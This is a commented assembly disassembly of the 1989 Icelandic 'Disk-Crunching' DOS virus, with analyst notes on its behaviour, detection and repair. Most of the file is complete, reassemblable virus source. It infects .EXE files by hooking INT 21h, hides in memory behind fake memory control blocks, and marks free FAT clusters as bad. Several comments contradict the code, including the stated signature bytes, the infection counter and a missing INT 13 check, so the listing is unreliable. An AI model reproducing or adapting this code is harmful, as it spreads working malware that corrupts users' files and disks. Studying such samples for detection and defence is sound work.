
;       THE ICELANDIC "DISK-CRUNCHING" VIRUS 
;
;       Another possible name for this virus might be "One-in-ten", since
;       it tries to infect every tenth program run. The Icelandic name for
;       this virus ("Diskaetuvirus") translates to "Disk-eating virus"
;
;       It was first located at one site in mid-June '89. It has since then
;       been found at a few other places, but is quite rare yet. So far it
;       does not seem to have spread to any other country.
;
;       Disassembly done in June/July '89.
;
;       The author of this program is unknown, but it appears to be of
;       Icelandic origin. 
;
;       All comments in this file were added by Fridrik Skulason,
;       University of Iceland/Computing Services.
;
;       INTERNET:     frisk@rhi.hi.is 
;       UUCP:         ...mcvax!hafro!rhi!frisk
;       BIX:          FRISK
;
;       To anyone who obtains this file - please be careful with it, I
;       would not like to see this virus be distributed too much. The code
;       is very clear, and the virus is quite well written. It would be VERY
;       easy to modify it to do something really harmful.
;
;       A short description of the virus:
;
;       It only infects .EXE files. Infected files grow by 656 to 671
;       bytes, and the length of the infected file MOD 16 will always be 0.
;       The virus attaches itself to the end of the programs it infects. 
;
;       When an infected file is run, the virus copies itself to top of
;       free memory, and modifies the memory blocks, in order to hide from
;       memory mapping programs. Some programs may overwrite this area,
;       causing the computer to crash.
;
;       The virus does nothing if some other program has hooked INT 13
;       before it is run. This is probably done to avoid detection by
;       protection programs, but it also means that many ordinary
;       programs like SideKick and disk cache software will disable it.
;       Even the PRINT command will disable the virus. This reduces the
;       spread of the virus, but also greatly reduces the possibility that
;       the virus will be detected. 
;
;       The virus will hook INT 21H and when function 4B (EXEC) is called
;       it sometimes will infect the program being run. It will check every
;       tenth program that is run for infection, and if it is not already
;       infected, it will be.
;
;       The virus will remove the Read-Only attribute before trying to
;       infect programs.
;
;       Infected files can be easily recognized, since they always end in
;       4418,5F19.
;
;       To check for system infection, a byte at 0:37F is used - if it
;       contains FF the virus is installed in memory.
;
;       This virus is slightly harmful, but does no serious damage.
;       On floppy-only, or machines with 10Mbyte hard disks it will do
;       no damage at all, but on machines with larger hard disks it will
;       select one unused entry in the FAT table, and mark it as bad, when it
;       infects a file. Since the virus only modifies the first copy of the
;       FAT, a quick fix is simply to copy the second table over the first.
;       This is the only "mistake" I have found in this virus. It appears
;       to be very well written - What a shame the programmer did not use
;       his abilities for something more constructive.
;
;       This file was created in the following way: I wrote a small program,
;       that did nothing but write "Hello world!" and ran it several times,
;       until it became infected. I then diassembled the program, changed
;       it into an .ASM file, and worked on it until this file, when
;       assembled, produced the same file as the original infected one.
;
;       (Or almost the same - the checksum in the header is different).
;
VIRSIZ  EQU     128

        ASSUME CS:_TEXT,DS:_TEXT,SS:NOTHING,ES:NOTHING
;
;       This is the original program.
;
_TEXT1  SEGMENT PARA PUBLIC 'CODE'
_START  DB      0b4H,09H
        PUSH    CS
        POP     DS
        MOV     DX,OFFSET STRING
        INT     21H
        MOV     AX,4C00H
        INT     21H
STRING  DB      "This is an infected program!",0dh,0ah,"$"
 _TEXT1 ENDS

_TEXT SEGMENT PARA PUBLIC 'CODE'

;
;       The virus is basically divided in three parts.
;
;       1. The main program - run when an infected program is run. 
;          It will check if the system is already infected, and if not
;          it will install the virus.
;
;       2. The new INT 21 handler. It will look for EXEC calls, and
;          (sometimes) infect the program being run.
;          
;       3. The damage routine. It will select one unused cluster and mark it
;          as bad.
;
VIRUS   PROC FAR
;
;       This is a fake MCB
;
        DB      'Z',00,00,VIRSIZ,0,0,0,0,0,0,0,0,0,0,0,0
;
;       The virus starts by pushing the original start address on the stack,
;       so it can transfer control there when finished.
;
LABIA:  SUB     SP,4
        PUSH    BP
        MOV     BP,SP
        PUSH    AX
        MOV     AX,ES
;
;       Put the the original CS on the stack. The ADD AX,data instruction
;       is modified by the virus when it infects other programs.
;
        DB      05H     
ORG_CS  DW      0010H
        MOV     [BP+4],AX
;
;       Put the the original IP on the stack. This MOV [BP+2],data instruction
;       is modified by the virus when it infects other programs.
;
        DB      0C7H,46H,02H
ORG_IP  DW      0000H
;
;       Save all registers that are modified.
;
        PUSH    ES
        PUSH    DS      
        PUSH    BX
        PUSH    CX
        PUSH    SI
        PUSH    DI
;
;       Check if already installed. Quit if so.
;
        XOR     AX,AX
        MOV     ES,AX
        CMP     ES:[37FH],BYTE PTR 0FFH 
        JNE     L2
;
;       Restore all registers and return to the original program.
;
EXIT:   POP     DI
        POP     SI
        POP     CX
        POP     BX
        POP     DS
        POP     ES
        POP     AX
        POP     BP
        RET
;
;       Check if INT 13 is 0070:xxxx or F000:xxxx. If not, assume some
;       program is monitoring int 13, and quit.
;
;
;       Set the installation flag, so infected programs run later will
;       recognize the infection.
;
L2:     MOV     ES:[37FH],BYTE PTR 0FFH
;
;       The virus tries to hide from detection by modifying the memory block it
;       uses, so it seems to be a block that belongs to the operating system.
;
;       It looks rather weird, but it seems to work. 
;
        MOV     AH,52H                  
        INT     21H                     
        MOV     AX,ES:[BX-2]            
        MOV     ES,AX                   
        ADD     AX,ES:[0003]            
        INC     AX                      
        INC     AX                      
        MOV     CS:[0001],AX            
;
;       Next, the virus modifies the memory block of the infected program.
;       It is made smaller, and no longer the last block.
;
        MOV     BX,DS                   
        DEC     BX                      
        MOV     DS,BX
        MOV     AL,'M'
        MOV     DS:[0000],AL
        MOV     AX,DS:[0003]
        SUB     AX,VIRSIZ
        MOV     DS:[0003],AX
        ADD     BX,AX
        INC     BX
;
;       Then the virus moves itself to the new block. For some reason 2000
;       bytes are transferred, when 651 would be enough. Maybe the author just
;       wanted to leave room for future expansions.
;
        MOV     ES,BX
        XOR     SI,SI
        XOR     DI,DI
        PUSH    CS
        POP     DS
        MOV     CX,2000
        CLD
        REP     MOVSB
;
;       The virus then transfers control to the new copy of itself.
;
        PUSH    ES
        MOV     AX,OFFSET L3
        PUSH    AX
        RET                             
;
;       The main program modifies INT 21 next and finally returns to the
;       original program. The original INT 21 vector is stored inside the
;       program so a JMP [OLD INT21] instruction can be used.
;
L3:     XOR     AX,AX
        MOV     ES,AX
        MOV     AX,ES:[0084H]
        MOV     CS:[OLD21],AX
        MOV     AX,ES:[0086H]
        MOV     CS:[OLD21+2],AX
        MOV     AX,CS
        MOV     ES:[0086H],AX
        MOV     AX,OFFSET NEW21
        MOV     ES:[0084H],AX
        JMP     EXIT
VIRUS   ENDP
;
;       This is the INT 21 replacement. It only does something in the case
;       of an EXEC call.
;
NEW21   PROC FAR                        
        CMP     AH,4BH                  
        JE      L5
L4:     DB      0EAH
OLD21   DW      0,0
;
;       Only attack every tenth program run.
;
L5:     DEC     CS:[COUNTER]
        JNE     L4
        MOV     CS:[COUNTER],2
;
;       Save all affected registers.
;
        PUSH    AX
        PUSH    BX
        PUSH    CX
        PUSH    DX
        PUSH    SI
        PUSH    DS
;
;       Search for the file name extension ...
;
        MOV     BX,DX
L6:     INC     BX
        CMP     BYTE PTR [BX],'.'
        JE      L8
        CMP     BYTE PTR [BX],0
        JNE     L6
;
;       ... and quit unless it starts with "EX".
;
L7:     POP     DS
        POP     SI
        POP     DX
        POP     CX
        POP     BX
        POP     AX
        JMP     L4
L8:     INC     BX
        CMP     WORD PTR [BX],5845H
        JNE     L7
;
;       When an .EXE file is found, the virus starts by turning off
;       the read-only attribute. The read-only attribute is not restored
;       when the file has been infected.
;
        MOV     AX,4300H                ; Get attribute
        INT     21H
        JC      L7
        MOV     AX,4301H                ; Set attribute
        AND     CX,0FEH
        INT     21H
        JC      L7
;
;       Next, the file is examined to see if it is already infected.
;       The signature (4418 5F19) is stored in the last two words.
;
        MOV     AX,3D02H                ; Open / write access
        INT     21H     
        JC      L7
        MOV     BX,AX                   ; file handle in BX
        PUSH    CS                      ; now DS is no longer needed
        POP     DS
;
;       The header of the file is read in at [ID+8]. The virus then
;       modifies itself, according to the information stored in the
;       header. (The original CS and IP addressed are stored).
;
        MOV     DX,OFFSET ID+8
        MOV     CX,1CH
        MOV     AH,3FH
        INT     21H
        JC      L9
        MOV     AX,DS:ID[1CH]
        MOV     DS:[ORG_IP],AX
        MOV     AX,DS:ID[1EH]
        ADD     AX,10H
        MOV     DS:[ORG_CS],AX
;
;       Next the read/write pointer is moved to the end of the file-4,
;       and the last 4 bytes read. They are compared to the signature,
;       and if equal nothing happens.
;
        MOV     AX,4202H
        MOV     CX,-1
        MOV     DX,-4
        INT     21H
        JC      L9
        ADD     AX,4    
        MOV     DS:[LEN_LO],AX
        JNC     L8A
        INC     DX
L8A:    MOV     DS:[LEN_HI],DX

        MOV     AH,3FH
        MOV     CX,4
        MOV     DX,OFFSET ID+4
        INT     21H
        JNC     L11
L9:     MOV     AH,3EH
        INT     21H
L10:    JMP     L7
;
;       Compare to 4418,5F19
;
L11:    MOV     SI,OFFSET ID+4
        MOV     AX,[SI]
        CMP     AX,6F50H
        JNE     L12
        MOV     AX,[SI+2]
        CMP     AX,546FH
        JE      L9
;
;       The file is not infected, so the next thing the virus does is
;       infecting it. First it is padded so the length becomes a multiple
;       of 16 bytes. Tis is probably done so the virus code can start at a
;       paragraph boundary.
;
L12:    MOV     AX,DS:[LEN_LO]
        AND     AX,0FH
        JZ      L13
        MOV     CX,16
        SUB     CX,AX
        ADD     DS:[LEN_LO],CX
        JNC     L12A
        INC     DS:[LEN_HI]
L12A:   MOV     AH,40H
        INT     21H
        JC      L9
;
;       Next the main body of the virus is written to the end.
;
L13:    XOR     DX,DX
        MOV     CX,OFFSET ID + 4
        MOV     AH,40H
        INT     21H
        JC      L9
;
;       Next the .EXE file header is modified:
;
;       First modify initial IP
;
        MOV     AX,OFFSET LABIA
        MOV     DS:ID[1CH],AX
;
;       Modify starting CS = Virus CS. It is computed as:
;
;       (Original length of file+padding)/16 - Start of load module
;
        MOV     DX,DS:[LEN_HI]
        MOV     AX,DS:[LEN_LO]
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SHR     DX,1
        RCR     AX,1
        SUB     AX,DS:ID[10H]
        MOV     DS:ID[1EH],AX
;
;       Modify length mod 512
;
        ADD     DS:[LEN_LO],OFFSET ID+4
        JNC     L14
        INC     DS:[LEN_HI]
L14:    MOV     AX,DS:[LEN_LO]
        AND     AX,511
        MOV     DS:ID[0AH],AX
;
;       Modify number of blocks used
;
        MOV     DX,DS:[LEN_HI]
        MOV     AX,DS:[LEN_LO]
        ADD     AX,511
        JNC     L14A
        INC     DX
L14A:   MOV     AL,AH
        MOV     AH,DL
        SHR     AX,1
        MOV     DS:ID[0CH],AX
;
;       Finally the modified header is written back to the start of the
;       file.
;
QQQ:    MOV     AX,4200H
        XOR     CX,CX
        XOR     DX,DX
        INT     21H
        JC      ENDIT
        MOV     AH,40H
        MOV     DX,OFFSET ID+8
        MOV     CX,1CH
        INT     21H
        JC      ENDIT
        MOV     AH,3EH
        INT     21H
        JNC     DAMAGE  
;
;       Infection is finished - close the file and execute it
;
ENDIT:  JMP     L9
NEW21   ENDP
;
;       The damage routine. As before noted, it will only do damage on
;       systems with a hard disk larger than 10Mbytes (With 16 bit FAT)
;
TEMP    DW      0
;
;       Start by getting some information about the current drive, like size
;       of the FAT etc. Then compute the total number of sectors, and quit
;       unless it is greater than 20740. This is probably done since larger
;       disks use 16 bit FAT entries, instead of 12, which makes life easier
;       for the programmer.
;
DAMAGE: MOV     AH,32H
        MOV     DL,0
        INT     21H
        CMP     AL,0FFH
        JE      L21
        XOR     AX,AX
        MOV     AL,[BX+4]
        INC     AX
        MOV     CS:[TEMP],AX
        MOV     AX,[BX+0DH]
        DEC     AX
        MUL     CS:[TEMP]
        ADD     AX,[BX+0BH]
        JNC     L15A
        INC     DX
L15A:   CMP     DX,0
        JNE     L15B
        CMP     AX,20740
        JBE     L21
;
;       Check if DOS version is 4.0 or greater. If so, use a 16 bit value
;       for numbers of sectors in the FAT, otherwise use a 8 bit entry.
L15B:   PUSH    BX
        MOV     AH,30H
        INT     21H
        POP     BX
        CMP     AL,4
        JAE     L15
        XOR     AX,AX
        MOV     AL,[BX+0FH]
        JMP     SHORT L16
L15:    MOV     AX,[BX+0FH]
L16:    ADD     AX,[BX+6]
        DEC     AX
        MOV     DX,AX
        MOV     AL,[BX]
;
;       Read the last sector in the first copy of the FAT. Search backwards
;       for an unused entry. If none is found, read the sector before that
;       and so on. If no free entry is found on the entire disk then quit.
;
L20:    MOV     CX,1
        MOV     BX,OFFSET ID+4
        PUSH    CS
        POP     DS
        PUSH    AX
        PUSH    DX
        INT     25H
        POPF
        JC      L21
        POP     DX
        POP     AX
        MOV     SI,510
L17:    MOV     BX,DS:[ID+4+SI]
        CMP     BX,0000
        JE      L19
        CMP     SI,0000
        JE      L18
        DEC     SI
        DEC     SI
        JMP     L17
L18:    DEC     DX
        CMP     DX,8
        JE      L21
        JMP     L20
;
;       A free entry has been found. Make it look like a bad cluster, by
;       changing the 0000 value to FFF7.
;
L19:    MOV     DS:[ID+4+SI],0FFF7H
        MOV     CX,1
        MOV     BX,OFFSET ID+4
        INT     26H
        POPF
L21:    JMP     L7

COUNTER DB      2
LEN_LO  DW      ?
LEN_HI  DW      ?
ID      DW    6F50H,546FH             ; The signature of the virus.
;
;       A buffer, used for data from the file.
;
_TEXT   ENDS

        END LABIA

